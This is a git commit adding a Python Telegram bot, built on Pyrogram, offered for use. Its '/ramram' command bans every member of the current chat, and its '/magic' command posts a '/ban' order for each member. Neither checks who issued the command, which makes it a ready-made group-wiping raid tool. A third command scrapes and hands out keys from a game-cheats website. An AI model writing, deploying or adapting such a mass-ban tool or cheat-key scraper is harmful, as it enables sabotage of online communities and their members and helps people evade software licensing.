41ca0324ac1504e266ef6be392b47a416524fd25
JarvisxdAi <123392833+JarvisxdAi@users.noreply.github.com>
2023-09-07 03:43:49 +0530

    Add files via upload

---
+++ bot/__init__.py
@@ -0,0 +1,65 @@
+import asyncio
+import requests
+
+from pyrogram.errors.exceptions.flood_420 import FloodWait
+from pyrogram import Client,filters
+from pyrogram.types import *
+from .config import Config
+import logging
+from pyrogram.errors import (
+    ChatAdminRequired
+)
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+if not Config.TELEGRAM_TOKEN:
+   bot=Client(api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,session_name=Config.PYRO_SESSION)   
+else:
+   bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)
+
+@bot.on_message(filters.command("ramram"))
+async def _(bot, msg):
+    print("getting memebers from {}".format(msg.chat.id))
+    async for i in bot.iter_chat_members(msg.chat.id):
+        try:
+            await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
+            print("kicked {} from {}".format(i.user.id,msg.chat.id))
+        except FloodWait as e:
+            await asyncio.sleep(e.x)
+            print(e)
+        except Exception as e:
+            print(" failed to kicked {} from {}".format(i.user.id,e))           
+    print("process completed")
+
+
+@bot.on_message(filters.command("magic"))
+async def mban(bot, msg):
+    print("getting memebers from {}".format(msg.chat.id))
+    async for i in bot.iter_chat_members(msg.chat.id):
+        try:
+            await bot.send_message(msg.chat.id, f"/ban {i.user.id}")
+        except FloodWait as e:
+            await asyncio.sleep(e.x)
+            print(e)
+        except Exception as e:
+            print(" failed to kicked {} from {}".format(i.user.id,e))           
+    print("process completed")
+
+@bot.on_message(filters.command(["getkey", "/getkey"]))
+async def key(bot, message):
+    res = requests.get('https://free.scarcheats.xyz/redirect.php')
+    s = (res.content)
+    g = (res.text)
+    r = requests.get('https://api.github.com/events', stream = True)
+    await message.reply("YOUR KEY IS :-",g[-207:-189])
+
+@bot.on_message(filters.command(["start", "agora"]))
+async def hello(bot, message):
+    await message.reply('''
+    Hey Folks,
+    You Can Get Key From Here
+    tab /getkey
+    ''')
